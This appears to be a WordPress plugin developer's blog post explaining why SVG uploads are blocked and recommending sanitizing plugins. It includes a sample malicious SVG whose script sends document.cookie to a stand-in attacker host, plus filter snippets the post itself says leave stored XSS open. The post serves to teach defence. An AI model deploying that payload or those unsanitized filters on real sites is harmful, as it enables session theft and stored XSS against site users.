---
title: How to Enable SVG Uploads in WordPress Without Opening a Security Hole
date: 2026-10-29
description: WordPress blocks SVG uploads by default because an SVG file can carry executable code. Here's why, and how to allow them without creating a stored XSS risk.
plugin: simple-svg-enabler
---

Try to upload a logo or an icon saved as `.svg` to your Media Library, and WordPress will reject it with "Sorry, this file type is not permitted for security reasons." That's not a bug or a missing setting — WordPress leaves SVG off its allowed file list on purpose, and the usual workarounds people paste from forums skip the part that actually matters.

## Why WordPress blocks SVG in the first place

Most image formats — JPEG, PNG, WebP — are just pixel data. An SVG file is different: it's a text-based XML document, and XML can contain scripting. A perfectly valid `.svg` file can embed a `<script>` tag or an `onload` attribute that runs JavaScript the moment the file is opened in a browser:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
</svg>
```

If that file ends up in your Media Library and someone opens its URL directly, or it's rendered inline on a page, the script runs in the context of your site. That's a stored XSS vulnerability, and it's exactly why WordPress core keeps SVG out of the default allowed MIME types rather than trusting every upload to be a clean vector graphic.

## The quick filter that people paste in — and why it's not enough

The common fix you'll find in tutorials is a few lines in `functions.php`:

```php
function allow_svg_upload( $mimes ) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter( 'upload_mimes', 'allow_svg_upload' );
```

On its own, this usually doesn't even work: since WordPress 4.7.1, uploads also go through `wp_check_filetype_and_ext()`, which inspects the actual file content with PHP's `finfo` and resets the type if it doesn't match what it expects for that extension. SVG routinely fails that check, so you need a second filter just to get the upload accepted:

```php
function fix_svg_filetype( $data, $file, $filename, $mimes ) {
    if ( substr( $filename, -4 ) === '.svg' ) {
        $data['ext']  = 'svg';
        $data['type'] = 'image/svg+xml';
    }
    return $data;
}
add_filter( 'wp_check_filetype_and_ext', 'fix_svg_filetype', 10, 4 );
```

And here's the part most copy-pasted snippets leave out: neither filter sanitizes anything. They just tell WordPress "trust this file extension." The malicious SVG above would upload and save just fine with this code in place. You've removed the block, not the risk.

![Diagram comparing an unsanitized SVG upload, which can carry a script that runs as stored XSS, against an SVG upload run through a sanitizer library, which strips scripts before the file reaches the Media Library](/img/blog/enable-svg-uploads-wordpress-safely.svg "SVG uploads: raw filter versus sanitized")

## The real fix: sanitize the file, don't just allow the extension

Allowing the MIME type and sanitizing the content are two separate problems, and only the second one removes the risk. Sanitizing means parsing the SVG and stripping anything that isn't decorative markup: `<script>` tags, `on*` event attributes (`onload`, `onclick`...), `<foreignObject>`, and external references that could load remote content. Writing that parser yourself is not a weekend project worth attempting when mature libraries already exist — the PHP library most WordPress SVG plugins rely on for this is [`enshrined/svg-sanitize`](https://github.com/darylldoyle/svg-sanitizer), which runs an allow-list of safe tags and attributes against the file before anything touches disk.

Rather than wiring that library in yourself, two real, actively maintained plugins already do this:

- **[Safe SVG](https://wordpress.org/plugins/safe-svg/)** (free) — adds the SVG MIME type and runs every upload through `enshrined/svg-sanitize` via the `wp_handle_upload_prefilter` hook before it's saved. It also lets you preview and resize SVGs in the Media Library like any other image. This is the plugin to reach for if you just need safe SVG support with no extra configuration.
- **[SVG Support](https://wordpress.org/plugins/svg-support/)** (free) — similar goal, with its own sanitization pass plus options to control which user roles can upload SVGs and whether they render inline or as an `<img>` tag.

Install either with WP-CLI if you have shell access:

```bash
wp plugin install safe-svg --activate
```

Once one of these is active, drop the manual filters above entirely — a global `upload_mimes` change without sanitization is still a liability even if a sanitizing plugin is also active, since some upload paths (REST API uploads, import tools, custom forms) may not go through the plugin's hook at all.

## If you do allow SVG manually, restrict it to roles you trust

If, for some reason, you can't install a plugin and need the raw filter approach, at minimum limit it to Administrators:

```php
function allow_svg_upload_admins_only( $mimes ) {
    if ( current_user_can( 'manage_options' ) ) {
        $mimes['svg'] = 'image/svg+xml';
    }
    return $mimes;
}
add_filter( 'upload_mimes', 'allow_svg_upload_admins_only' );
```

That doesn't sanitize anything either, but it does mean a compromised Author or Contributor account — which is a far more common entry point than a compromised admin — can't use this hole to plant a malicious SVG in the first place.

## What we're building

We're working on **Simple SVG Enabler**, a plugin aimed at this exact gap: enable SVG uploads with real allow-list sanitization built in, plus per-role control over who's allowed to upload them, in one settings screen. It's not on WordPress.org yet — you can see where it fits among our other plugins on the [homepage](/#simple-svg-enabler) — but if you need safe SVG uploads today, Safe SVG or SVG Support above will do the job right now.

## A simple checklist

- Don't enable SVG uploads with a bare `upload_mimes` filter — it allows the extension, not the content.
- Use a plugin that sanitizes on upload (Safe SVG or SVG Support), not just one that unblocks the MIME type.
- If you ever write your own filter, scope it to `manage_options` or another trusted capability, never to every logged-in user.
- Treat any SVG already in your Media Library from before you locked this down as unverified — check it for `<script>` tags or `on*` attributes before trusting it.
